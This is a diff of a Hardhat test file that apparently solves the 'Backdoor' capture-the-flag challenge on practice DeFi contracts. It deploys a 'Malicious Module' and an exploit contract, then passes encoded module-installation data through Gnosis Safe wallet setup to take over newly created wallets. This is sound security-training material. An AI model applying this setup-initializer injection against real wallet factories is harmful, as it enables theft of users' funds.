@@ -42,14 +42,19 @@ describe("[Challenge] Backdoor", function () {
         masterCopy = this.masterCopy.connect(attacker) //this.gnosisSafeImpl
         token = this.token.connect(attacker)
 
+        const controllerModule = await (
+            await ethers.getContractFactory("ControllerModule", attacker)
+        ).deploy()
+
         exploit = await (
-            await ethers.getContractFactory("Exploit", deployer)
+            await ethers.getContractFactory("Exploit", attacker)
         ).deploy(
             attacker.address,
             walletFactory.address,
             masterCopy.address,
             walletRegistry.address,
-            token.address
+            token.address,
+            controllerModule.address
         )
 
         const log = async () => {
@@ -66,80 +71,17 @@ describe("[Challenge] Backdoor", function () {
             console.log("\t token address:", token.address)
             console.log("\t walletFactory address:", walletFactory.address)
             console.log("\t exploit address:", exploit.address)
-
+            console.log("\t Malicious Module address:", controllerModule.address)
             console.log("\t ===================================================")
         }
 
-        //createProxyWithCallback()
-        // address _singleton,  ->masterCopy
-        // bytes memory initializer,
-        // uint256 saltNonce,
-        // IProxyCreationCallback callback ->IProxyCreationCallback callback
-
         await log()
 
-        let functionSig =
-            "function setup(address[],uint256,address,bytes,address,address,uint256,address)"
-        let ABI = [functionSig]
-        let regexConst = /function\s*(.*)\s*\(/
-        var functionName = regexConst.exec(functionSig)
-
-        //console.log("Function Name:", functionName[1])
-
-        let iface = new ethers.utils.Interface(ABI)
-        const selector = iface.getSighash(functionName[1])
-
-        // console.log("Function Selector:", selector)
-
-        // "0x1234567890123456789012345678901234567890",
-        // ethers.utils.parseEther("1.0"),
-        // console.log("ethers.utils.AddressZero", ethers.constants.AddressZero)
-        zero = ethers.constants.AddressZero
-
-        // function setup(
-        //     address[] calldata _owners,
-        //     uint256 _threshold,
-        //     address to,
-        //     bytes calldata data,
-        //     address fallbackHandler,
-        //     address paymentToken,
-        //     uint256 payment,
-        //     address payable paymentReceiver
-
-        //createProxyWithCallback()
-        // address _singleton,  ->masterCopy
-        // bytes memory initializer,
-        // uint256 saltNonce,
-        // IProxyCreationCallback callback ->IProxyCreationCallback callback
-        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"]
+        const moduleABI = ["function installModule(address exploitContract)"]
         const moduleIFace = new ethers.utils.Interface(moduleABI)
-        const setupData = moduleIFace.encodeFunctionData("setupToken", [
-            token.address,
-            exploit.address,
-        ])
+        const setupData = moduleIFace.encodeFunctionData("installModule", [exploit.address])
 
-        //malicious module
-
-        // const moduleABI = ["function enableModule(address module)"]
-        // const moduleIFace = new ethers.utils.Interface(moduleABI)
-        // const setupData = moduleIFace.encodeFunctionData("enableModule", exploit.address)
-
-        // Do exploit in one transaction (after contract deployment)
         await exploit.exploit(users, setupData)
-
-        // let saltNonce = 0
-        // for (let i = 0; i < users.length; i++) {
-        //     let paramsArray = [[users[i]], 1, exploit.address, setupData, zero, zero, 0, zero]
-        //     let callData = iface.encodeFunctionData(functionName[1], paramsArray)
-
-        //     console.log("CallData", callData)
-        //     await walletFactory.createProxyWithCallback(
-        //         masterCopy.address, //_singleton
-        //         callData, //initializer
-        //         saltNonce, //saltNonce
-        //         walletRegistry.address //callback
-        //     )
-        // }
 
         await log()
     })
